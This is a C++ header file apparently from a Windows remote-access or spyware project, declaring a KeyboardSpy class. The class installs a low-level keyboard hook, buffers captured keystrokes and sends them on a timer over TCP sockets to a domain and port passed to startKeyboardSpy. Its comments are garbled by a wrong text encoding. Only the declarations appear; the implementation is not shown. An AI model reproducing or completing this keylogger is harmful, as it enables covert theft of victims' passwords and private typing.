#pragma once
#ifndef KEYBOARDSPY_H
#define KEYBOARDSPY_H

#include "TcpSocket.h"
#include <windows.h>
#include <iostream>
#include <vector>





class KeyboardSpy
{
public:
    KeyboardSpy();
    ~KeyboardSpy();

 

    // ��������ں���
    static void startKeyboardSpy(std::string domain, int port);

    // ��ΪҪ����win32���ݣ�
    static void createDialogByNewThread();
    static DWORD WINAPI threadProc(LPVOID args);
    static INT_PTR WINAPI keyboardSpyWndProc(HWND hWnd, UINT uiMsg, WPARAM wParam, LPARAM lParam);

    // �������ݽṹ
    typedef struct
    {
        int iCode;
        int iScanCode;
        int iFlags;
        int iTime;
        int iExtraInfo;
    } HookStruct;

    // ��װ���Ƴ�������ȡ��������
    static HHOOK installKeyboardHook();
    static void uninstallKeyboardHook(HHOOK hHook);
    static LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);

    // ���»�ɾ����socket��������
    static void addSocket(TcpSocket* sock);
    static std::vector<TcpSocket*> getSockets();
    static void delSocket(TcpSocket* sock);
    static void addBuffer(char data);
    static void delBuffer();

    // ������ȡ������
    static void CALLBACK sendKeyboardData(HWND hWnd, UINT uiMsg, UINT uiTimer, DWORD dwTimer);
};

#endif // KEYBOARDSPY_H
